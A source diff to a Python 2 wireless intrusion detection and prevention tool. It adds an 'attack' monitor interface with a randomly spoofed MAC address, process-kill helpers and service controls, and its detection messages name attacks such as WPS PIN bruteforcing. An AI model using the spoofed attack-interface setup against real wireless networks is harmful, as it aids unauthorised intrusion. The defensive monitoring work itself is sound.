+        __builtin__.DisplayNetworkFilter=__builtin__.DisplayNetworkFilter + fcolor.BCyan + "BSSID - " + fcolor.Pink + str(__builtin__.NETWORK_BSSID_FILTER) + "\t"
     if __builtin__.NETWORK_CLIENT_FILTER!="ALL":
         __builtin__.DisplayNetworkFilter=__builtin__.DisplayNetworkFilter + fcolor.BCyan + "Client - " + fcolor.Pink + str(__builtin__.NETWORK_CLIENT_FILTER) + "\t"
     if __builtin__.NETWORK_PROBE_FILTER!="ALL":
@@ -4706,6 +8754,20 @@ def DisplayInfrastructure():
                 if __builtin__.NETWORK_CLIENT_FILTER=="No" and ListInfo_ConnectedClient[x]=="0":
                     ToDisplay="1"
  
+            if ToDisplay=="1" and __builtin__.NETWORK_ESSID_FILTER!="":
+                tmESSID=str(ListInfo_ESSID[x]).upper()
+                tmESSID2=str(__builtin__.NETWORK_ESSID_FILTER).upper()
+                if tmESSID.find(tmESSID2)!=-1:
+                    ToDisplay="1"
+                else:
+                    ToDisplay=""
+            if ToDisplay=="1" and __builtin__.NETWORK_BSSID_FILTER!="":
+                tmBSSID=str(ListInfo_BSSID[x]).upper()
+                tmBSSID2=str(__builtin__.NETWORK_BSSID_FILTER).upper()
+                if tmBSSID.find(tmBSSID2)!=-1:
+                    ToDisplay="1"
+                else:
+                    ToDisplay=""
             EnrichData="  "
             if ListInfo_Enriched[x]=="Yes":
                 EnrichData=fcolor.BIRed + " *"
@@ -4748,6 +8810,8 @@ def DisplayInfrastructure():
                     Cipher="C/T/WEP104"
                 if ListInfo_Auth[x]=="MGTPSK":
                     ListInfo_Auth[x]="MGT/PSK"
+                if str(ListInfo_WPSLock[x])=="(null)":
+                    ListInfo_WPSLock[x]="Null"
                 print  BSSIDColor + HighlightMonitoringMAC(str(ListInfo_BSSID[x])) + "  " + ClientColor + str(ListInfo_ConnectedClient[x]).ljust(5) + InfoColor + str(CPrivacy) + str(ListInfo_Privacy[x]).ljust(6) + InfoColor + str(Cipher).ljust(12) + str(ListInfo_Auth[x]).ljust(10) + str(ListInfo_Channel[x]).ljust(5) + str(ListInfo_BestQuality[x]).ljust(7) + str(ListInfo_QualityRange[x]) + InfoColor + "\t " + fcolor.SBlue + str(APStd).ljust(6) + InfoColor + str(ListInfo_WPS[x]).ljust(5)  + str(ListInfo_WPSVer[x]).ljust(5) + str(ListInfo_WPSLock[x]).ljust(5) + str(EnrichData) + ESSIDColor + str(DESSID) + OUIColor + str(ListInfo_BSSID_OUI[x]) 
             else:
                 if __builtin__.HIDE_INACTIVE_SSID=="Yes":
@@ -4854,7 +8918,7 @@ def DisplayInfrastructure():
                                 if int(__builtin__.ListInfo_CTimeGap[cln]) < int(__builtin__.HIDE_AFTER_MIN):
                                     MACCOLOR=fcolor.SGreen
                                     SELFMAC=""
-                                    if ListInfo_STATION[cln]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[cln]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[cln]==__builtin__.SELECTED_IFACE_MAC:
+                                    if ListInfo_STATION[cln]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[cln]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[cln]==__builtin__.SELECTED_IFACE_MAC or ListInfo_STATION[cln]==__builtin__.SELECTED_ATK_MAC:
                                         MACCOLOR=fcolor.BPink
                                         SELFMAC=fcolor.BWhite + " [ " + fcolor.BPink + "Your Interface MAC" + fcolor.BWhite + " ]"
                                     DisplayUnassociated += 1
@@ -4933,7 +8997,7 @@ def EnrichSSID():
         RewriteIWList()
     if IsFileDirExist(__builtin__.TMP_IWList_DUMP)=="F" and __builtin__.FIXCHANNEL==0:
         open(__builtin__.TMP_IWList_DUMP,"a+b").write("Cell XX - Address: XX:XX:XX:XX:XX:XX")
-        BSSID="";ESSI="";Freq="";Channel="";Quality="";Signal="";PairwiseCipher="";GroupCipher="";AuthSuite="";WPAVer="";EncKey="";WMode="";BitRate="";
+        BSSID="";ESSID="";Freq="";Channel="";Quality="";Signal="";PairwiseCipher="";GroupCipher="";AuthSuite="";WPAVer="";EncKey="";WMode="";BitRate="";
         with open(__builtin__.TMP_IWList_DUMP,"r") as f:
             FoundStage="0"
             for line in f:
@@ -5779,6 +9843,8 @@ def AnalysePacketCapture():
     if __builtin__.LOAD_PKTCAPTURE=="Yes":
         if __builtin__.PCapProc!="":
             KillSubProc(str(__builtin__.PCapProc))
+        Search="WAIDPS - Capturing Packets"
+        KillProc(Search)
         DeleteExistingPacketFiles()
         if IsFileDirExist(__builtin__.PacketDumpFileBak)=="F":
             os.remove(__builtin__.PacketDumpFileBak)
@@ -5812,6 +9878,10 @@ def GetFileDetail(FName):
     __builtin__.FileModified=ConvertDateFormat(time.ctime(mtime),"%c")
     __builtin__.FileCreated=ConvertDateFormat(time.ctime(ctime),"%c")
     __builtin__.FileSize=ConvertByte(float(size))
+    if str(size)!="":
+        __builtin__.FileSizeB=int(size)
+    else:
+        __builtin__.FileSizeB=0
 
 def FormatNumber(sStr):
     return '{0:04}'.format(int(sStr))
@@ -6060,6 +10130,8 @@ def ReadCommand():
             rfile=SearchFileOnDir(FName)
             if rfile!="":
                 FName=rfile
+                FileExist=1
+            if IsFileDirExist(FName)=="F" and FileExist!=1:
                 FileExist=1
             if FileExist==1:
                 if str(__builtin__.FileExt).upper()==".PCAP" or str(__builtin__.FileExt).upper()==".CAP":
@@ -6813,7 +10885,6 @@ def ReadCommand():
                 else:
                     printl (spacing + fcolor.SGreen + "Merging... Please wait...","0","")
                     Rund="mergecap -a " + str(FILETOREAD) + " -w " +  str(DIRUSE) + str(OUTPUTFILE) # + " > /dev/null 2>&1 &"
-##                    print "Rund : " + str(Rund)
                     ps=subprocess.Popen(Rund , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
                     ps.wait()
                     readout=str(ps.stdout.read())
@@ -6879,6 +10950,8 @@ def ReadCommand():
                 if rfile!="":
                     FName=rfile
                     FileExist=1
+                if IsFileDirExist(FName)=="F" and FileExist!=1:
+                    FileExist=1
                 if FileExist==1:
                     print fcolor.BBlue + spacing  + "Load PCAP File - " + fcolor.SYellow + str(FName)
                     __builtin__.PacketDumpFileBak2=__builtin__.PacketDumpFileBak
@@ -6933,6 +11006,7 @@ def ReadCommand():
         print spacing + lblColor + "Selected Interface : " +  fcolor.SCyan + str(__builtin__.SELECTED_IFACE_MAC).ljust(20) + fcolor.BWhite + " [ " + fcolor.BRed + str(__builtin__.SELECTED_IFACE) + fcolor.BWhite + " ]"
         print spacing + lblColor + "Managed Interface  : " +  fcolor.SYellow + str(__builtin__.SELECTED_MANIFACE_MAC).ljust(20) + fcolor.BWhite + " [ " + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE) + fcolor.BWhite + " ]"
         print spacing + lblColor + "Monitor Interface  : " +  fcolor.SPink + str(__builtin__.SELECTED_MON_MAC).ljust(20) + fcolor.BWhite + " [ " + fcolor.BRed + str(__builtin__.SELECTED_MON) + fcolor.BWhite + " ]"
+        print spacing + lblColor + "Attack Interface   : " +  fcolor.SPink + str(__builtin__.SELECTED_ATK_MAC).ljust(20) + fcolor.BWhite + " [ " + fcolor.BRed + str(__builtin__.SELECTED_ATK) + fcolor.BWhite + " ]"
         print ""
         print spacing + fcolor.BBlue + "Filtering Information "
         FILTERSTR="";yc=0
@@ -7171,8 +11245,13 @@ def ReadCommand():
         if IsProgramExists(usrcmd_n[0])==True or IsProgramExists(usrcmd_n[0])==False:
             print fcolor.SBlue + "Running External Command : " + fcolor.BYellow + str(usr_resp_n) + fcolor.SWhite
             if usrcmd[0]=="CD" and len(usrcmd)>1:
-                os.chdir(usr_resp_n[3:])
-                print fcolor.SBlue + "New Directory            : " + fcolor.BYellow + str(os.getcwd()) + fcolor.SWhite
+                if IsFileDirExist(usr_resp_n[3:])=="D":
+                    os.chdir(usr_resp_n[3:])
+                    print fcolor.SBlue + "New Directory            : " + fcolor.BYellow + str(os.getcwd()) + fcolor.SWhite
+                else:
+                    print fcolor.SBlue + "Current Directory        : " + fcolor.BYellow + str(os.getcwd()) + fcolor.SWhite
+                    print fcolor.SRed + "Specified directory not found !"
+                    
             else:
                 print fcolor.SBlue + "Current Directory        : " + fcolor.BYellow + str(os.getcwd()) + fcolor.SWhite
                 original_sigint=signal.getsignal(signal.SIGINT)
@@ -7538,7 +11617,6 @@ def ShowIDSDetection(CMD):
                 GET_PROBEList=[]
             NotesInfo1="";NotesInfo2="";NotesInfo3=""
             DetailInfo=fcolor.BBlue + "     [Details]\n"
-#or int(GET_DATA86)>int(__builtin__.THRESHOLD_DATA86) or int(GET_DATA94)>int(__builtin__.THRESHOLD_DATAARP) or int(GET_AUTH)>int(__builtin__.THRESHOLD_AUTH) or int(GET_DEAUTH_AC)>int(__builtin__.THRESHOLD_DEAUTH) or int(GET_DEAUTH)>int(__builtin__.THRESHOLD_DEAUTH_AC) or int(GET_ASSOC)>int(__builtin__.THRESHOLD_ASSOC) or int(GET_DISASSOC)>int(__builtin__.THRESHOLD_DISASSOC) or int(GET_REASSOC)>int(__builtin__.THRESHOLD_REASSOC) or  int(GET_EAPOL_STD)>int(__builtin__.THRESHOLD_EAPOL_STD) int(GET_EAPOL_START)>int(__builtin__.THRESHOLD_EAPOL_START) or int(GET_WPS)>int(__builtin__.THRESHOLD_WPS) or int(GET_QOS)>int(__builtin__.THRESHOLD_QOS) or len(GET_PROBEList)>0:
             Breaks=DrawLine("-",fcolor.CReset + fcolor.Black,"","1")
             AddMACToList(FrMAC,List_AttackingMAC)
             AddMACToList(ToMAC,List_AttackingMAC)
@@ -7555,7 +11633,7 @@ def ShowIDSDetection(CMD):
                        if WPSInfo=="":
                            NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + ", it likely continuious fake authentication is deploy."
                        else:
-                           NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and WPS is enabled, likely WPS Pin bruteforcing."
+                           NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and WPS is enabled, likely WPS PIN bruteforcing."
                    else:
                        if WPSInfo!="":
                            NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and is WPS enabled, continuious association may indicated WPS bruteforcing."
@@ -7575,7 +11653,7 @@ def ShowIDSDetection(CMD):
                        if WPSInfo=="":
                            NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + ", it likely continuious fake authentication is deploy."
                        else:
-                           NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and WPS is enabled, likely WPS Pin bruteforcing."
+                           NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and WPS is enabled, likely WPS PIN bruteforcing."
                    else:
                        if WPSInfo!="":
                            NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and is WPS enabled, continuious association may indicated WPS bruteforcing."
@@ -7595,7 +11673,7 @@ def ShowIDSDetection(CMD):
                        if WPSInfo=="":
                            NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + ", it likely continuious fake authentication is deploy."
                        else:
-                           NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and WPS is enabled, likely WPS Pin bruteforcing."
+                           NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and WPS is enabled, likely WPS PIN bruteforcing."
                    else:
                        if WPSInfo!="":
                            NotesInfo2="The encryption for Access Point is " + fcolor.BYellow  + PrivacyInfo + ColorStd2 + " and is WPS enabled, continuious association may indicated WPS bruteforcing."
@@ -8338,6 +12416,8 @@ def CheckContainMyMAC(StrVal):
         return True
     if str(StrVal).find(__builtin__.SELECTED_IFACE_MAC)!=-1:
         return True
+    if str(StrVal).find(__builtin__.SELECTED_ATK_MAC)!=-1:
+        return True
     return False
 
 def ClearTSharkData():
@@ -8966,8 +13046,20 @@ def RunAirodump():
         cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Monitoring SSID/Clients' -hold -e 'airodump-ng --berlin " + str(TIMEOUT) + " -w " + appdir + "/tmp/Collect-Dump " + __builtin__.SELECTED_MON + "'"
     ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)	
     __builtin__.DumpProc=ps.pid
+    time.sleep(1)
+    if IsFileDirExist(__builtin__.Captured_CSV)!="F":
+        time.sleep(1.5)
+    if IsFileDirExist(__builtin__.Captured_CSV)!="F":
+        printc ("!!!", "Unable to find Airodump-NG output file.. Interface [ " + fcolor.BYellow + str(__builtin__.SELECTED_IFACE) + fcolor.BRed + " ] may be down..","")
+        printc (" ", fcolor.SWhite + "Try disconnect and reconnect the wireless interface if possible to see if it solve the problem..","")
+        print ""
+        __builtin__.ERRORFOUND=1
+        exit_gracefully(1)
+        
 
 def RunPacketCapture():
+    Search="WAIDPS - Capturing Packets"
+    KillProc(Search)
     if SHOW_IDS=="Yes" or SHOW_SUSPICIOUS_LISTING=="Yes":
         DelFile (tmpdir + "MON_*",1)
         if __builtin__.FIXCHANNEL==0:
@@ -8978,11 +13070,17 @@ def RunPacketCapture():
         __builtin__.PCapProc=ps.pid
 
 def KillProc(ProcName):
-    pstr="kill $(ps aux | grep '" + str(ProcName) + "' | awk '{print $2}')"
+    pstr="kill $(ps aux | grep '" + str(ProcName) + "' | awk '{print $2}') > /dev/null 2>&1"
     ps=subprocess.Popen(pstr, shell=True, stdout=subprocess.PIPE)	
     ps.wait();ps.stdout.close()
 
 def KillAllMonitor():
+    Search="WAIDPS - Sniffing"
+    KillProc(Search)
+    Search="WAIDPS - Auditing"
+    KillProc(Search)
+    Search="WAIDPS - Monitoring"
+    KillProc(Search)
     Search="WAIDPS - Monitoring SSID/Clients"
     KillProc(Search)
     Search="WAIDPS - Monitoring WPS"
@@ -8992,6 +13090,8 @@ def KillAllMonitor():
     Search="WAIDPS - Capturing Packets"
     KillProc(Search)
     Search="WAIDPS - Intrusion Prevention"
+    KillProc(Search)
+    Search="WAIDPS - "
     KillProc(Search)
 
 def GetMyMAC(IFACE):
@@ -9013,7 +13113,7 @@ def RandomMAC():
     ASSIGNED_MAC=str(H1) + ":" + str(H2) + ":" + str(H3) + ":" + str(H4) + ":" + str(H5) + ":" + str(H6) 
     return ASSIGNED_MAC;
 
-def CreateMonitor(CMD):
+def CreateMonitor(CMD,DontSpoofATK):
     if __builtin__.SELECTED_IFACE!="":
         if CMD=="1":
             printc (".",fcolor.SGreen + "Enabling monitoring for [ " + fcolor.BRed + __builtin__.SELECTED_IFACE + fcolor.SGreen + " ]...","")
@@ -9025,6 +13125,22 @@ def CreateMonitor(CMD):
         ps=subprocess.Popen("ifconfig wlmon0 up  > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
         ps.wait();ps.stdout.close()
         __builtin__.SELECTED_MON="wlmon0"
+        ASSIGNED_MAC=RandomMAC()
+        ps=subprocess.Popen("iw " + __builtin__.SELECTED_IFACE + " interface add atmon0 type monitor > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+        ps.wait();ps.stdout.close()
+        __builtin__.SELECTED_ATK="atmon0"
+        
+        if DontSpoofATK=="":
+            ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_ATK) + " down && ip link set dev " + str(__builtin__.SELECTED_ATK) + " address " + str(ASSIGNED_MAC) + " && ifconfig " + str(__builtin__.SELECTED_ATK) + " up > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+            ASSIGNED_MAC=RandomMAC()
+            ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_IFACE) + " down && ip link set dev " + str(__builtin__.SELECTED_IFACE) + " address " + str(ASSIGNED_MAC) + " && ifconfig " + str(__builtin__.SELECTED_IFACE) + " up > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+            ps.wait();ps.stdout.close()
+        else:
+            ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_IFACE) + " down && ip link set dev " + str(__builtin__.SELECTED_IFACE) + " address " + str(ASSIGNED_MAC) + " && ifconfig " + str(__builtin__.SELECTED_IFACE) + " up > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+            ps.wait();ps.stdout.close()
+            ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_ATK) + " down && ip link set dev " + str(__builtin__.SELECTED_ATK) + " address " + str(ASSIGNED_MAC) + " && ifconfig " + str(__builtin__.SELECTED_ATK) + " up > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+            ps.wait();ps.stdout.close()
+   
         ASSIGNED_MAC=RandomMAC()
         ps=subprocess.Popen("iw " + __builtin__.SELECTED_IFACE + " interface add probe0 type managed  > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
         ps.wait();ps.stdout.close()
@@ -9041,14 +13157,20 @@ def CreateMonitor(CMD):
         else:
             __builtin__.SELECTED_MANIFACE="probe0"
         __builtin__.SELECTED_MON="wlmon0"
+        __builtin__.SELECTED_MON_MAC=GetMyMAC(__builtin__.SELECTED_MON)
+        __builtin__.SELECTED_MANIFACE_MAC=GetMyMAC(__builtin__.SELECTED_MANIFACE)
+        __builtin__.SELECTED_IFACE_MAC=GetMyMAC(__builtin__.SELECTED_IFACE)
+        __builtin__.SELECTED_ATK_MAC=GetMyMAC(__builtin__.SELECTED_ATK)
+        __builtin__.SELECTED_IFACE_MAC=GetMyMAC(__builtin__.SELECTED_IFACE)
         if CMD=="1":
             print ""
-            printc (" ", fcolor.SWhite + "Selected Interface ==> " + fcolor.BRed + str(__builtin__.SELECTED_IFACE),"")
+            printc (" ", fcolor.SWhite + "Selected Interface ==> " + fcolor.BRed + str(__builtin__.SELECTED_IFACE) + "\t" + fcolor.SGreen + str(__builtin__.SELECTED_IFACE_MAC),"")
         ps=subprocess.Popen("ifconfig " + str(__builtin__.SELECTED_IFACE) + " up  > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
         ps.wait();ps.stdout.close()
         if CMD=="1":
-            printc (" ", fcolor.SWhite + "Selected Monitoring Interface ==> " + fcolor.BRed + str(__builtin__.SELECTED_MON),"")
-            printc (" ", fcolor.SWhite + "Selected Managing Interface   ==> " + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE),"")
+            printc (" ", fcolor.SWhite + "Selected Monitoring Interface ==> " + fcolor.BRed + str(__builtin__.SELECTED_MON) + "\t" + fcolor.SGreen + str(__builtin__.SELECTED_MON_MAC),"")
+            printc (" ", fcolor.SWhite + "Selected Attacking Interface  ==> " + fcolor.BRed + str(__builtin__.SELECTED_ATK) + "\t" + fcolor.SGreen + str(__builtin__.SELECTED_ATK_MAC),"")
+            printc (" ", fcolor.SWhite + "Selected Managing Interface   ==> " + fcolor.BRed + str(__builtin__.SELECTED_MANIFACE) + "\t" + fcolor.SGreen + str(__builtin__.SELECTED_MANIFACE_MAC),"")
             print ""
     else:
         if CMD=="1":
@@ -9141,6 +13263,8 @@ def Main():
     ps.wait();ps.stdout.close()
     ps=subprocess.Popen("iw wlmon0 del  > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
     ps.wait();ps.stdout.close()
+    ps=subprocess.Popen("iw atmon0 del  > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+    ps.wait();ps.stdout.close()
     MonCt = GetInterfaceList("MON")
     __builtin__.MONList=__builtin__.IFaceList
     Ct=GetInterfaceList("MAN")
@@ -9229,11 +13353,11 @@ def Main():
     if WLANCt!=0:
         if __builtin__.SELECTED_IFACE=="":
             __builtin__.SELECTED_IFACE=SelectInterfaceToUse()
-            CreateMonitor("1")
+            CreateMonitor("1","")
         else:
             if __builtin__.SELECTED_IFACE=="":
                 __builtin__.SELECTED_IFACE=__builtin__.IFaceList[0]
-            CreateMonitor("1")
+            CreateMonitor("1","")
             Rund="iwconfig " + __builtin__.SELECTED_IFACE + " > /dev/null 2>&1"
             result=os.system(Rund)
             if result==0:
@@ -9260,11 +13384,13 @@ def Main():
     __builtin__.SELECTED_MON_MAC=GetMyMAC(__builtin__.SELECTED_MON)
     __builtin__.SELECTED_MANIFACE_MAC=GetMyMAC(__builtin__.SELECTED_MANIFACE)
     __builtin__.SELECTED_IFACE_MAC=GetMyMAC(__builtin__.SELECTED_IFACE)
+    __builtin__.SELECTED_ATK_MAC=GetMyMAC(__builtin__.SELECTED_ATK)
     GetMonitoringMAC()
     GetWhitelist()
     DisplayPanel()
     ReadCommandHistory()
     CurLoop=0;RestartIFaceCt=0
+    IFace=__builtin__.SELECTED_IFACE
     while CurLoop<int(__builtin__.LoopCount):
         captured_pcap=tmpdir + "captured"
         retkey=WaitingCommands(__builtin__.TIMEOUT,1)
@@ -9311,7 +13437,7 @@ def WriteAccessPointDB():
             WriteFile=1
         if __builtin__.ListInfo_Enriched[x]=="Yes":
             WriteFile=1
-        if WriteFile==1 and len(ListInfo_BSSID[x])==17 and __builtin__.SELECTED_MANIFACE_MAC!=ListInfo_BSSID[x] and __builtin__.SELECTED_MON_MAC!=ListInfo_BSSID[x] and __builtin__.SELECTED_IFACE_MAC!=ListInfo_BSSID[x]:
+        if WriteFile==1 and len(ListInfo_BSSID[x])==17 and __builtin__.SELECTED_MANIFACE_MAC!=ListInfo_BSSID[x] and __builtin__.SELECTED_MON_MAC!=ListInfo_BSSID[x] and __builtin__.SELECTED_IFACE_MAC!=ListInfo_BSSID[x] and __builtin__.SELECTED_ATK_MAC!=ListInfo_BSSID[x] :
             SkipWrite=0
             with open(DBFile2,"r") as f:
                 for line in f:
@@ -9324,7 +13450,7 @@ def WriteAccessPointDB():
                             if tmplist[0]==str(ListInfo_BSSID[x]) and tmplist[5]==str(ListInfo_Channel[x]) and tmplist[6]==str(ListInfo_Privacy[x]) and tmplist[7]==str(ListInfo_Cipher[x]) and tmplist[8]==str(ListInfo_Auth[x]) and tmplist[10]==str(ListInfo_BitRate[x]) and tmplist[15]==str(ListInfo_WPS[x]) and tmplist[16]==str(ListInfo_WPSVer[x]) and tmplist[18]==str(ListInfo_ESSID[x]):
                                 SkipWrite=1
                                 break
-                if SkipWrite==0 and RemoveUnwantMAC(ListInfo_BSSID[x])!="" and ListInfo_BSSID[x]!=__builtin__.SELECTED_MON_MAC and ListInfo_BSSID[x]!=__builtin__.SELECTED_MANIFACE_MAC  and ListInfo_BSSID[x]!=__builtin__.SELECTED_IFACE_MAC:
+                if SkipWrite==0 and RemoveUnwantMAC(ListInfo_BSSID[x])!="" and ListInfo_BSSID[x]!=__builtin__.SELECTED_MON_MAC and ListInfo_BSSID[x]!=__builtin__.SELECTED_MANIFACE_MAC  and ListInfo_BSSID[x]!=__builtin__.SELECTED_IFACE_MAC and ListInfo_BSSID[x]!=__builtin__.SELECTED_ATK_MAC:
                     AddData=AddData+1
                     WriteData=str(ListInfo_BSSID[x]) + str(col)
                     WriteData=WriteData + str(ListInfo_Enriched[x]) + str(col)  
@@ -9357,8 +13483,7 @@ def WriteAllStationDB():
     while x<len(ListInfo_STATION):
         ESSID=FindESSID(ListInfo_CBSSID[x])
         SkipWrite=0
-        if len(ListInfo_STATION[x])==17 and __builtin__.SELECTED_MANIFACE_MAC!=ListInfo_STATION[x] and __builtin__.SELECTED_MON_MAC!=ListInfo_STATION[x] and __builtin__.SELECTED_IFACE_MAC!=ListInfo_STATION[x]:
-##            print "MON  MAC : " + str(__builtin__.SELECTED_MON_MAC)
+        if len(ListInfo_STATION[x])==17 and __builtin__.SELECTED_MANIFACE_MAC!=ListInfo_STATION[x] and __builtin__.SELECTED_MON_MAC!=ListInfo_STATION[x] and __builtin__.SELECTED_IFACE_MAC!=ListInfo_STATION[x] and __builtin__.SELECTED_ATK_MAC!=ListInfo_STATION[x]:
             if ListInfo_CBSSID[x].find("Not Associated")==-1:
                 with open(DBFile5,"r") as f:
                     next(f)
@@ -9375,7 +13500,7 @@ def WriteAllStationDB():
                                     if tmplist[2]==str(ListInfo_CESSID[x]):
                                         SkipWrite=1
                                         break
-                    if SkipWrite==0 and RemoveUnwantMAC(ListInfo_STATION[x])!="" and ListInfo_STATION[x]!=__builtin__.SELECTED_MON_MAC and ListInfo_STATION[x]!=__builtin__.SELECTED_MANIFACE_MAC and ListInfo_STATION[x]!=__builtin__.SELECTED_IFACE_MAC:
+                    if SkipWrite==0 and RemoveUnwantMAC(ListInfo_STATION[x])!="" and ListInfo_STATION[x]!=__builtin__.SELECTED_MON_MAC and ListInfo_STATION[x]!=__builtin__.SELECTED_MANIFACE_MAC and ListInfo_STATION[x]!=__builtin__.SELECTED_IFACE_MAC and ListInfo_STATION[x]!=__builtin__.SELECTED_ATK_MAC:
                         AddData=AddData+1
                         WriteData=str(ListInfo_STATION[x]) + str(col)
                         WriteData=WriteData + str(ListInfo_CBSSID[x]) + str(col) 
@@ -9439,6 +13564,235 @@ def WriteAllStationDB():
         x += 1
     return
 
+def ServiceCheck(SvrName,DisplaySvrName, cmdPrompt,cmdDisplay):
+    """
+        SvrName          = Actual service name
+        DisplaySvrName   = Service name to display
+        cmdPrompt   QEID = Question - Enable if disabled
+                    AEID = Automatic - Enable if disabled
+                    QDIE = Question - Disable if enabled
+                    ADIE = Automatic - Disable if enabled
+                    DS   = Display Status
+        cmdDisplay  "0"  = Don't Display
+                    "1"  = Display
+    """
+    cmdPrompt=cmdPrompt.upper()
+    lblColor=fcolor.CReset + fcolor.SGreen
+    txtColor=fcolor.CReset + fcolor.BYellow
+    Ask=""
+    if SvrName!="":
+        if cmdDisplay=="1" and cmdPrompt!="DS":
+            printc("i",lblColor + "Checking on " + txtColor + DisplaySvrName + lblColor + " Service..","")
+        SvrResult=ServiceCall(SvrName)
+        if cmdDisplay=="1" and cmdPrompt!="DS":
+            if SvrResult!="Unrecognised":
+                printc(" ",txtColor + DisplaySvrName + lblColor + " is " + fcolor.SRed + str(SvrResult),"")
+            else:
+                printc("!!!","" + txtColor + DisplaySvrName + fcolor.BRed + " Service not found !","")
+                return Ask
+        if cmdPrompt=="DS":
+            if SvrResult=="Disabled":
+                printc("i",txtColor + DisplaySvrName + lblColor + " is " + fcolor.BRed + str(SvrResult),"")
+                return
+            if SvrResult=="Enabled":
+                printc("i",txtColor + DisplaySvrName + lblColor + " is " + fcolor.BGreen + str(SvrResult),"")
+                return Ask
+            else:
+                printc("!!!","" + txtColor + DisplaySvrName + fcolor.BRed + " Service not found !","")
+                return Ask
+        if SvrResult=="Disabled":
+            if cmdPrompt=="QEID":
+                Ask=AskQuestion(DisplaySvrName + " is disabled. Enabled ?","Y/n","U","Y","")
+                if Ask=="y" or Ask=="Y" or Ask=="":
+                    result=os.system("service " + SvrName + " start > /dev/null 2>&1")
+                    if cmdDisplay=="1":
+                        if result==0:
+                            printc (" ",fcolor.SGreen + DisplaySvrName + " enabled..","")
+                        else:
+                            printc (" ",fcolor.SRed + DisplaySvrName + " failed to start..","")
+            if cmdPrompt=="AEID":
+                if cmdDisplay=="1":
+                    printc ("  ",lblColor + "Enabling " + DisplaySvrName + "...","")
+                result=os.system("service " + SvrName + " start > /dev/null 2>&1")
+                if cmdDisplay=="1":
+                    if result==0:
+                        printc (" ",fcolor.SGreen + DisplaySvrName + " enabled..","")
+                    else:
+                        printc (" ",fcolor.SRed + DisplaySvrName + " failed to start..","")
+        if SvrResult=="Enabled":
+            if cmdPrompt=="QDIE":
+                Ask=AskQuestion(DisplaySvrName + " is enabled. Disable ?","Y/n","U","Y","")
+                if Ask=="y" or Ask=="Y" or Ask=="":
+                    result=os.system("service " + SvrName + " stop > /dev/null 2>&1")
+                    if cmdDisplay=="1":
+                        if result==0:
+                            printc (" ",fcolor.SGreen + DisplaySvrName + " disabled..","")
+                        else:
+                            printc (" ",fcolor.SRed + DisplaySvrName + " failed to stop..","")
+            if cmdPrompt=="ADIE":
+                if cmdDisplay=="1":
+                    printc (" ",lblColor + "Disabling " + DisplaySvrName + "...","")
+                result=os.system("service " + SvrName + " stop > /dev/null 2>&1")
+                if cmdDisplay=="1":
+                    if result==0:
+                        printc (" ",fcolor.SGreen + DisplaySvrName + " disabled..","")
+                    else:
+                        printc (" ",fcolor.SRed + DisplaySvrName + " failed to stop..","")
+    return Ask
+
+def ServiceCall(SvrName):
+    result=os.system("service " + SvrName + " status > /dev/null 2>&1")
+    if result==0:
+        CStatus="Enabled"
+    if result==768:
+        CStatus="Disabled"
+    if result==256:
+        CStatus="Unrecognised"
+    return CStatus;
+
+def GetIPAddress(iface):
+    __builtin__.IPADDR=""
+    __builtin__.GATEWAY=""
+    readout=""
+    if iface!="":
+        cmdLine="ifconfig " + str(iface) + " | grep 'inet addr' | awk -F: '{print $2}' | awk '{print $1}'"
+        ps=Popen(str(cmdLine), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
+        ps.wait()
+        readout=str(ps.stdout.read().replace("\n","").lstrip().rstrip())
+        __builtin__.IPADDR=readout
+        cmdLine="ip route show | grep 'default' | awk '{print $3}'"
+        ps=Popen(str(cmdLine), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)
+        ps.wait()
